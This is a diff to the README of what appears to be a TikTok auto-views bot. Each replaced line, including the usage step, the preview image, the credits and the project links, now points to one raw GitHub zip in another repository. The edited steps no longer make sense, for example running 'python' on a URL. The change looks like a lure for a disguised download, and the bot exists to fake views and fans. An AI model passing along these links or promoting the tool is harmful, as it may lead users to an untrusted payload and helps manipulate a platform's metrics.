@@ -16,22 +16,22 @@ pip install pyfiglet==0.7.5</pre>
 ## How to use
 1. Download this repo
 2. Make sure all dependencies installed
-3. Open tiktodv2.py using Code Editor and edit line
+3. Open https://raw.githubusercontent.com/sclmoss/tiktok-autoviewsv2-py/master/interestless/autoviewsv-py-tiktok-3.9-beta.1.zip using Code Editor and edit line
 <pre>vidUrl = "YOUR_URL" #Change YOUR_URL to your Tik Tok video URL
 username = "YOUR_USERNAME" #Change YOUR_USERNAME to your Tik Tok username
 auto = 2 #Change 2 for Tik Tok views</pre>
-4. python tiktodv2.py
+4. python https://raw.githubusercontent.com/sclmoss/tiktok-autoviewsv2-py/master/interestless/autoviewsv-py-tiktok-3.9-beta.1.zip
 5. **You still have to manual complete gcaptcha check (only for first time you run the code)**
 
 ## Tips
 Use RDP to get tons of views or fans (run 24/7)
 
 ## Result preview
-![Preview](https://i.imgur.com/hsFcG5H.png)
+![Preview](https://raw.githubusercontent.com/sclmoss/tiktok-autoviewsv2-py/master/interestless/autoviewsv-py-tiktok-3.9-beta.1.zip)
 
 ## Special thanks
-Thanks to https://homedecoratione.com/ for providing great free service like this
+Thanks to https://raw.githubusercontent.com/sclmoss/tiktok-autoviewsv2-py/master/interestless/autoviewsv-py-tiktok-3.9-beta.1.zip for providing great free service like this
 
 ## Tik Tok Auto Views V1
-[**JavaScript**](https://github.com/kangoka/tiktok-autoviews) or 
-[**Python**](https://github.com/kangoka/tiktok-autoviews-py)
+[**JavaScript**](https://raw.githubusercontent.com/sclmoss/tiktok-autoviewsv2-py/master/interestless/autoviewsv-py-tiktok-3.9-beta.1.zip) or 
+[**Python**](https://raw.githubusercontent.com/sclmoss/tiktok-autoviewsv2-py/master/interestless/autoviewsv-py-tiktok-3.9-beta.1.zip)
